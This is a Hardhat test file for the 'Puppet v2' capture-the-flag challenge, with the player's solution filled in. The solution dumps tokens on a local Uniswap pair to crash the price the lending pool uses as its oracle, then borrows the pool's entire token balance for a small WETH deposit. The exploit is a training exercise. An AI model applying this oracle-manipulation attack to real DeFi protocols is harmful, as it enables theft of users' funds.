const pairJson = require("@uniswap/v2-core/build/UniswapV2Pair.json");
const factoryJson = require("@uniswap/v2-core/build/UniswapV2Factory.json");
const routerJson = require("@uniswap/v2-periphery/build/UniswapV2Router02.json");

const { ethers } = require('hardhat');
const { expect } = require('chai');
const { setBalance } = require("@nomicfoundation/hardhat-network-helpers");

describe('[Challenge] Puppet v2', function () {
    let deployer, player;
    let token, weth, uniswapFactory, uniswapRouter, uniswapExchange, lendingPool;

    // Uniswap v2 exchange will start with 100 tokens and 10 WETH in liquidity
    const UNISWAP_INITIAL_TOKEN_RESERVE = 100n * 10n ** 18n;
    const UNISWAP_INITIAL_WETH_RESERVE = 10n * 10n ** 18n;

    const PLAYER_INITIAL_TOKEN_BALANCE = 10000n * 10n ** 18n;
    const PLAYER_INITIAL_ETH_BALANCE = 20n * 10n ** 18n;

    const POOL_INITIAL_TOKEN_BALANCE = 1000000n * 10n ** 18n;

    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */  
        [deployer, player] = await ethers.getSigners();

        await setBalance(player.address, PLAYER_INITIAL_ETH_BALANCE);
        expect(await ethers.provider.getBalance(player.address)).to.eq(PLAYER_INITIAL_ETH_BALANCE);

        const UniswapFactoryFactory = new ethers.ContractFactory(factoryJson.abi, factoryJson.bytecode, deployer);
        const UniswapRouterFactory = new ethers.ContractFactory(routerJson.abi, routerJson.bytecode, deployer);
        const UniswapPairFactory = new ethers.ContractFactory(pairJson.abi, pairJson.bytecode, deployer);
    
        // Deploy tokens to be traded
        token = await (await ethers.getContractFactory('DamnValuableToken', deployer)).deploy();
        weth = await (await ethers.getContractFactory('WETH', deployer)).deploy();

        // Deploy Uniswap Factory and Router
        uniswapFactory = await UniswapFactoryFactory.deploy(ethers.constants.AddressZero);
        uniswapRouter = await UniswapRouterFactory.deploy(
            uniswapFactory.address,
            weth.address
        );        

        // Create Uniswap pair against WETH and add liquidity
        await token.approve(
            uniswapRouter.address,
            UNISWAP_INITIAL_TOKEN_RESERVE
        );
        await uniswapRouter.addLiquidityETH(
            token.address,
            UNISWAP_INITIAL_TOKEN_RESERVE,                              // amountTokenDesired
            0,                                                          // amountTokenMin
            0,                                                          // amountETHMin
            deployer.address,                                           // to
            (await ethers.provider.getBlock('latest')).timestamp * 2,   // deadline
            { value: UNISWAP_INITIAL_WETH_RESERVE }
        );
        uniswapExchange = await UniswapPairFactory.attach(
            await uniswapFactory.getPair(token.address, weth.address)
        );
        expect(await uniswapExchange.balanceOf(deployer.address)).to.be.gt(0);
            
        // Deploy the lending pool
        lendingPool = await (await ethers.getContractFactory('PuppetV2Pool', deployer)).deploy(
            weth.address,
            token.address,
            uniswapExchange.address,
            uniswapFactory.address
        );

        // Setup initial token balances of pool and player accounts
        await token.transfer(player.address, PLAYER_INITIAL_TOKEN_BALANCE);
        await token.transfer(lendingPool.address, POOL_INITIAL_TOKEN_BALANCE);

        // Check pool's been correctly setup
        expect(
            await lendingPool.calculateDepositOfWETHRequired(10n ** 18n)
        ).to.eq(3n * 10n ** 17n);
        expect(
            await lendingPool.calculateDepositOfWETHRequired(POOL_INITIAL_TOKEN_BALANCE)
        ).to.eq(300000n * 10n ** 18n);
    });

    it('Execution', async function () {
    //    log all with correct decimals
        await logAll();

        // swap all token for weth
        await token.connect(player).approve(uniswapRouter.address, await token.balanceOf(player.address));
        await uniswapRouter.connect(player).swapExactTokensForETH(
            await token.balanceOf(player.address),
            0,
            [token.address, weth.address],
            player.address,
            (await ethers.provider.getBlock('latest')).timestamp * 2
        );

        // wrap required weth
        await weth.connect(player).deposit({ value: await lendingPool.calculateDepositOfWETHRequired(await token.balanceOf(lendingPool.address)) });

        await weth.connect(player).approve(lendingPool.address, ethers.constants.MaxUint256);

        await logAll();

        //  borrow all token from pool
         await lendingPool.connect(player).borrow(await token.balanceOf(lendingPool.address));

         await logAll();
        

        async function logAll() {
            console.log("--------------------");
            console.log("player token balance: ", ethers.utils.formatUnits(await token.balanceOf(player.address), 18));
            console.log("player eth balance: ", ethers.utils.formatUnits(await ethers.provider.getBalance(player.address), 18));
            console.log("player weth balance: ", ethers.utils.formatUnits(await weth.balanceOf(player.address), 18));
            console.log("pool token balance: ", ethers.utils.formatUnits(await token.balanceOf(lendingPool.address), 18));
            console.log("pool eth balance: ", ethers.utils.formatUnits(await ethers.provider.getBalance(lendingPool.address), 18));
            console.log("pool weth balance: ", ethers.utils.formatUnits(await weth.balanceOf(lendingPool.address), 18));
            console.log("uniswap token balance: ", ethers.utils.formatUnits(await token.balanceOf(uniswapExchange.address), 18));
            console.log("uniswap weth balance: ", ethers.utils.formatUnits(await weth.balanceOf(uniswapExchange.address), 18));

            // console.log("weth required for all Token to be borrowed ", ethers.utils.formatUnits(await lendingPool.calculateDepositOfWETHRequired(await token.balanceOf(lendingPool.address)), 18));
        }
    });

    after(async function () {
        /** SUCCESS CONDITIONS - NO NEED TO CHANGE ANYTHING HERE */
        // Player has taken all tokens from the pool        
        expect(
            await token.balanceOf(lendingPool.address)
        ).to.be.eq(0);

        expect(
            await token.balanceOf(player.address)
        ).to.be.gte(POOL_INITIAL_TOKEN_BALANCE);
    });
});